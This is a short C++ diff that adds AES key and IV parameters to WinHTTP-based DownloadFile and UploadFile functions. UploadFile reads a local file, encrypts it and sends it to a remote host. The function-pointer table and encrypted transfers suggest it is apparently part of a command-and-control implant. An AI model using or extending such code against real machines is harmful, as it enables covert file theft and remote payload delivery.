@@ -210,6 +210,7 @@ namespace System::Http
 	// Wrapper for send&read&write response.
 	BOOL DownloadFile(
 		Procs::PPROCS pProcs,
+		Crypt::PCRYPT pCrypt,
 		HINTERNET hConnect,
 		LPCWSTR lpHost,
 		INTERNET_PORT nPort,
@@ -261,7 +262,11 @@ namespace System::Http
 		}
 
 		// Decrypt data
-		std::vector<BYTE> bytes = Crypt::Decrypt(wEnc);
+		std::vector<BYTE> bytes = Crypt::Decrypt(
+			wEnc,
+			pCrypt->pAES->hKey,
+			pCrypt->pAES->iv
+		);
 		
 		// Write data to file
 		DWORD dwWritten;
@@ -278,6 +283,7 @@ namespace System::Http
 
 	BOOL UploadFile(
         Procs::PPROCS pProcs,
+		Crypt::PCRYPT pCrypt,
         HINTERNET hConnect,
         LPCWSTR lpHost,
         INTERNET_PORT nPort,
@@ -288,7 +294,11 @@ namespace System::Http
         // Read a local file.
         std::vector<BYTE> bytes = System::Fs::ReadBytesFromFile(wSrc);
         // Encrypt the data
-        std::wstring wEnc = Crypt::Encrypt(bytes);
+        std::wstring wEnc = Crypt::Encrypt(
+			bytes,
+			pCrypt->pAES->hKey,
+			pCrypt->pAES->iv
+		);
 		std::string sEnc = Utils::Convert::UTF8Encode(wEnc);
 
         System::Http::WinHttpResponse resp = System::Http::SendRequest(
